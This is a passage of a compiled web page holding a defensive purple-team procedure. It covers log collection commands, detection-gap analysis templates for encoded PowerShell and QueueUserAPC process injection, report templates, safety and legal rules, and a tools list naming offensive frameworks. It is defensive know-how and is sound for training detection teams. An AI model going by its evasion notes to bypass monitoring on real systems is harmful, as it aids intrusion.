checkpoint\n'})}),"\n",(0,s.jsx)(n.h3,{id:"data-collection",children:"Data Collection"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Telemetry Sources to Review:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Windows Event Logs\nwevtutil epl Security C:\\Logs\\Security_test.evtx\nwevtutil epl System C:\\Logs\\System_test.evtx\nwevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\\Logs\\Sysmon_test.evtx\nwevtutil epl "Microsoft-Windows-PowerShell/Operational" C:\\Logs\\PowerShell_test.evtx\n\n# Linux Logs\ncp /var/log/syslog /evidence/syslog_test.txt\ncp /var/log/auth.log /evidence/auth_test.txt\njournalctl --since "2025-10-05 14:00:00" --until "2025-10-05 15:00:00" > journalctl_test.txt\n\n# EDR/SIEM Exports\n# Export alerts matching test timeframe\n# Export raw events from test endpoints\n# Document query used and export format\n'})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"6-analysis--gap-identification",children:"6. Analysis & Gap Identification"}),"\n",(0,s.jsx)(n.h3,{id:"detection-coverage-analysis",children:"Detection Coverage Analysis"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"For Each Tested Technique:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-markdown",children:'## Technique: T1059.001 (PowerShell)\n\n**Test Executed**: Base64-encoded PowerShell command\n**Command**: `powershell.exe -encodedCommand [BASE64]`\n**Timestamp**: 2025-10-05 14:32:15 UTC\n\n**Detection Results**:\n\u2705 **Detected by**:\n- EDR: Alert "Suspicious PowerShell Execution" (High confidence)\n- Sysmon: Event ID 1 (Process Creation) logged command line\n- PowerShell Script Block Logging: Event ID 4104 captured decoded script\n\n\u274c **Missed by**:\n- SIEM correlation rule (no alert generated)\n- Network monitoring (no DNS/HTTP activity to correlate)\n\n**Detection Quality**:\n- TTD (Time to Detect): 12 seconds\n- TTT (Time to Triage): 8 minutes (analyst reviewed alert)\n- Fidelity: High (low false positive history for this rule)\n- Context: Full command line captured, parent process identified\n\n**Gap Analysis**:\n- SIEM rule not tuned for encoded PowerShell (only checks for "-encodedCommand" flag)\n- No correlation with user behavior analytics (was this user expected to run PowerShell?)\n\n**Recommendations**:\n1. Update SIEM rule to decode Base64 and search for known malicious patterns\n2. Implement UBA baseline for PowerShell usage per user/role\n3. Alert on PowerShell from unusual parent processes (Word, Excel, etc.)\n'})}),"\n",(0,s.jsx)(n.h3,{id:"false-positive-analysis",children:"False Positive Analysis"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Document Benign Activity Triggering Alerts:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'False Positive Example:\n- Alert: "Credential Access via Registry"\n- Trigger: Legitimate backup software reading SAM hive\n- Root Cause: Rule too broad (any registry access to SAM/SECURITY)\n- Recommendation: Add exception for backup process (signed binary, expected schedule)\n'})}),"\n",(0,s.jsx)(n.h3,{id:"evasion-success-tracking",children:"Evasion Success Tracking"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"If Technique Evaded Detection:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-markdown",children:"## Evasion Success: Process Injection via QueueUserAPC\n\n**Technique**: T1055.004 (Asynchronous Procedure Call)\n**Tool**: Custom injector\n\n**Why Detection Failed**:\n1. EDR heuristics did not flag QueueUserAPC API call\n2. Sysmon Event ID 8 (CreateRemoteThread) not triggered (different injection method)\n3. No memory scanning at time of injection\n\n**Exploit Conditions**:\n- Unsigned injector binary\n- Injection into legitimate process (explorer.exe)\n- No network activity post-injection (stayed dormant)\n\n**Remediation**:\n- Implement ETW (Event Tracing for Windows) monitoring for thread creation APIs\n- Add memory scanning on suspicious process access events\n- Deploy YARA rules to detect injection frameworks\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"7-reporting--improvement",children:"7. Reporting & Improvement"}),"\n",(0,s.jsx)(n.h3,{id:"executive-summary-template",children:"Executive Summary Template"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-markdown",children:"# Purple Team Exercise Report\n**Date**: 2025-10-05\n**Duration**: 4 hours\n**Participants**: Red Team (3), Blue Team (5), SOC (2)\n\n## Objectives\nValidate detection coverage for credential access and lateral movement techniques used by APT29.\n\n## Summary\n- **Techniques Tested**: 12\n- **Techniques Detected**: 9 (75%)\n- **High-Fidelity Alerts**: 7 (78%)\n- **False Positives**: 3\n- **Critical Gaps**: 3 (privilege escalation, evasion, persistence)\n\n## Key Findings\n\u2705 **Strengths**:\n- PowerShell logging and EDR provide excellent coverage\n- Lateral movement via RDP detected consistently\n- Credential dumping from LSASS detected in < 30 seconds\n\n\u274c **Weaknesses**:\n- Process injection techniques evaded EDR behavioral detection\n- LOLBins (MSBuild, Regsvr32) not monitored\n- C2 beaconing patterns not correlated in SIEM\n\n## Recommendations\n1. **Immediate**: Deploy Sysmon config update for process injection monitoring\n2. **Short-term** (30 days): Implement LOLBin detection rules (Sigma/Splunk)\n3. **Long-term** (90 days): Enhance C2 detection with JA3 fingerprinting and beaconing analysis\n"})}),"\n",(0,s.jsx)(n.h3,{id:"improvement-tracking",children:"Improvement Tracking"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Action Items with Owners:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"| Priority | Finding | Recommended Action | Owner | Due Date | Status |\n|----------|---------|-------------------|-------|----------|--------|\n| P1 | Process injection not detected | Deploy Sysmon config v15 | SecOps | 2025-10-12 | In Progress |\n| P1 | MSBuild execution not alerted | Create SIEM rule for LOLBins | SOC Lead | 2025-10-15 | Pending |\n| P2 | C2 beaconing not correlated | Implement JA3/JA3S monitoring | NetSec | 2025-11-01 | Planning |\n| P3 | UBA not detecting anomalous PowerShell | Tune UBA baseline for PowerShell | SIEM Admin | 2025-12-01 | Backlog |\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"8-safety--legal",children:"8. Safety & Legal"}),"\n",(0,s.jsx)(n.h3,{id:"safety-protocols",children:"Safety Protocols"}),"\n",(0,s.jsxs)(n.p,{children:["\u274c ",(0,s.jsx)(n.strong,{children:"Never"}),":"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Test in production without isolated telemetry"}),"\n",(0,s.jsx)(n.li,{children:"Use real malware or exploit kits"}),"\n",(0,s.jsx)(n.li,{children:"Exfiltrate actual sensitive data"}),"\n",(0,s.jsx)(n.li,{children:"Perform denial of service attacks"}),"\n",(0,s.jsx)(n.li,{children:"Pivot beyond authorized scope"}),"\n",(0,s.jsx)(n.li,{children:"Test without SOC coordination"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u2705 ",(0,s.jsx)(n.strong,{children:"Always"}),":"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Use benign simulators (Atomic Red Team, Caldera)"}),"\n",(0,s.jsx)(n.li,{children:"Maintain rollback capability (snapshots)"}),"\n",(0,s.jsx)(n.li,{children:"Coordinate timing with SOC"}),"\n",(0,s.jsx)(n.li,{children:"Document every action with timestamps"}),"\n",(0,s.jsx)(n.li,{children:"Verify isolation before execution"}),"\n",(0,s.jsx)(n.li,{children:"Stop immediately on unexpected behavior"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"legal-considerations",children:"Legal Considerations"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Authorization Documentation:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Signed approval from CISO/CIO"}),"\n",(0,s.jsx)(n.li,{children:"Scope clearly defined and acknowledged"}),"\n",(0,s.jsx)(n.li,{children:"Indemnification (if external red team involved)"}),"\n",(0,s.jsx)(n.li,{children:"NDA/confidentiality agreements"}),"\n",(0,s.jsx)(n.li,{children:"Safe harbor clause for good-faith testing"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Compliance:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"No violations of Computer Fraud and Abuse Act (CFAA)"}),"\n",(0,s.jsx)(n.li,{children:"Respect organizational acceptable use policies"}),"\n",(0,s.jsx)(n.li,{children:"No testing of third-party services without consent"}),"\n",(0,s.jsx)(n.li,{children:"Proper handling of any discovered vulnerabilities"}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"9-tools-reference",children:"9. Tools Reference"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Tool"}),(0,s.jsx)(n.th,{children:"Purpose"}),(0,s.jsx)(n.th,{children:"Link"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Red Team Frameworks"})}),(0,s.jsx)(n.td,{}),(0,s.jsx)(n.td,{})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Atomic Red Team"}),(0,s.jsx)(n.td,{children:"Technique-specific tests"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://github.com/redcanaryco/atomic-red-team",children:"github.com/redcanaryco/atomic-red-team"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"MITRE Caldera"}),(0,s.jsx)(n.td,{children:"Automated adversary emulation"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://github.com/mitre/caldera",children:"github.com/mitre/caldera"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Infection Monkey"}),(0,s.jsx)(n.td,{children:"Lateral movement testing"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://www.guardicore.com/infectionmonkey/",children:"guardicore.com/infectionmonkey"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Cobalt Strike"}),(0,s.jsx)(n.td,{children:"C2 framework (commercial)"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://www.cobaltstrike.com",children:"cobaltstrike.com"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Metasploit"}),(0,s.jsx)(n.td,{children:"Exploitation framework"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://www.metasploit.com",children:"metasploit.com"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Detection Tools"})}),(0,s.jsx)(n.td,{}),(0,s.jsx)(n.td,{})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Sysmon"}),(0,s.jsx)(n.td,{children:"Windows event logging"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon",children:"docs.microsoft.com/sysinternals"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Sigma"}),(0,s.jsx)(n.td,{children:"Generic detection rules"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://github.com/SigmaHQ/sigma",children:"github.com/SigmaHQ/sigma"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"YARA"}),(0,s.jsx)(n.td,{children:"Pattern matching"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://virustotal.github.io/yara/",children:"virustotal.github.io/yara"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"Analysis"})}),(0,s.jsx)(n.td,{}),(0,s.jsx)(n.td,{})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"ATT&CK Navigator"}),(0,s.jsx)(n.td,{children:"Technique coverage mapping"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://mitre-attack.github.io/attack-navigator/",children:"mitre-attack.github.io/attack-navigator"})})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"DeTT&CT"}),(0,s.jsx)(n.td,{children:"Detection coverage scoring"}),(0,s.jsx)(n.td,{children:(0,s.jsx)(n.a,{href:"https://github.com/rabobank-cdc/DeTTECT",children:"github.com/rabobank-cdc/DeTTECT"})})]})]})]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"10-common-pitfalls",children:"10. Common Pitfalls"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u274c Testing without proper authorization (legal risk)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Using production systems (availability/integrity risk)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Not coordinating with SOC (alert fatigue, missed detections)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Forgetting cleanup procedures (persistence artifacts remain)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Not documenting methodology (can't reproduce results)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Testing too many techniques at once (difficult to correlate)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Ignoring false positives (alert tuning opportunity missed)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Not retesting after remediation (validate fixes)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Poor communication (red/blue team siloed)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Treating this as red team vs. blue team (collaborative improvement, not competition)"}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"related-sops",children:"Related SOPs"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Analysis:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Analysis/sop-reverse-engineering",children:"Reverse Engineering"})," - Analyzing evasion techniques in binaries"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Analysis/sop-cryptography-analysis",children:"Cryptography Analysis"})," - Encryption-based evasion methods"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Analysis/sop-malware-analysis",children:"Malware Analysis"})," - Malware evasion technique analysis"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Pentesting & Security:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-ad-pentest",children:"Active Directory Pentesting"})," - AD-specific evasion techniques"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-linux-pentest",children:"Linux Pentesting"})," - Linux evasion and anti-forensics"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-web-application-security",children:"Web Application Security"})," - WAF and IDS/IPS bypass"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-mobile-security",children:"Mobile Security"})," - Mobile platform evasion techniques"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-vulnerability-research",children:"Vulnerability Research"})," - Testing exploit detection"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Pentesting/sop-bug-bounty",children:"Bug Bounty Hunting"})," - Understanding detection evasion for responsible disclosure"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"../../Security/Analysis/sop-forensics-investigation",children:"Forensics Investigation"})," - Testing anti-forensics effectiveness"]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}}}]);